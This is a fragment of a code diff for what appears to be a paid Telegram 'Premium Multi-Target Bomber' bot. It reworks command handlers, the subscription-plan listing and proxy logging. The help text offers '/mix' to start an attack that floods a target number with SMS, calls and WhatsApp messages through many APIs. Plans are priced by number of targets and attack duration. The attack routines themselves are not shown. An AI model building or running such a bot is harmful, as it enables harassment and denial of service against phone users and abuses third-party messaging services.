     database = DatabaseWrapper()
-    
-    global manager
     manager = AttackManager()
     
     for sig in (signal.SIGINT, signal.SIGTERM):
         loop.add_signal_handler(sig, lambda: asyncio.create_task(shutdown_handler(sig, loop)))
     
-    app = (Application.builder()
+    from telegram.ext import ApplicationBuilder
+    app = (ApplicationBuilder()
            .token(BOT_TOKEN)
            .read_timeout(30)
            .write_timeout(30)
@@ -2916,29 +2613,31 @@ def main():
            .pool_timeout(30)
            .build())
     
+    # ====== TELEGRAM HANDLERS ======
+    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        await update.message.reply_text(f"🔥 Welcome to Premium Multi-Target Bomber!\n\n📡 Total APIs: {len(APIS)}\n🎯 SMS + Call + WhatsApp\n\nUse /help for commands.")
+    
+    async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        await update.message.reply_text(f"🤖 Bot Commands:\n/mix - Start attack\n/status - Check status\n/account - Your plan\n/plan - Subscription plans\n/redeem - Redeem code\n/protect - Protect number\n/unprotect - Unprotect number\n\n📡 Total APIs: {len(APIS)}")
+    
+    async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        msg = "💳 AVAILABLE PLANS:\n\n"
+        for key, p in PLANS.items():
+            msg += f"🔹 {p['name']} - ₹{p['price']}\n"
+            msg += f"   {p['days']} days, {p['concurrent']} targets, {p['max_duration']}min\n\n"
+        await update.message.reply_text(msg)
+    
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("mix", mix_command))
-    app.add_handler(CommandHandler("status", status_command))
-    app.add_handler(CommandHandler("account", account_command))
-    app.add_handler(CommandHandler("plan", plan_command))
-    app.add_handler(CommandHandler("redeem", redeem_command))
-    app.add_handler(CommandHandler("protect", protect_command))
-    app.add_handler(CommandHandler("unprotect", unprotect_command))
     app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("cancel", cancel_command))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
-    app.add_handler(CallbackQueryHandler(btn_handler))
+    app.add_handler(CommandHandler("plan", plan_command))
     
     logger.info("=" * 60)
     logger.info(f"🔥 PREMIUM MULTI-TARGET BOMBER Started")
     logger.info(f"📡 Total APIs Loaded: {len(APIS)}")
-    logger.info(f"📞 Voice/Call APIs: Included")
-    logger.info(f"💬 SMS APIs: Included")
-    logger.info(f"📱 WhatsApp APIs: Included")
-    logger.info(f"👑 Admin Panel Ready")
-    logger.info(f"🌐 Web Server Running on Port {PORT}")
-    logger.info(f"🗄️ Using SQLite Storage")
-    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
+    if USE_PROXY and PROXY_URL:
+        logger.info(f"🔒 Proxy Enabled: {PROXY_URL}")
+    else:
+        logger.info(f"🔓 Proxy Disabled - Direct Connection")
     logger.info("=" * 60)
     
     loop.create_task(web_server())
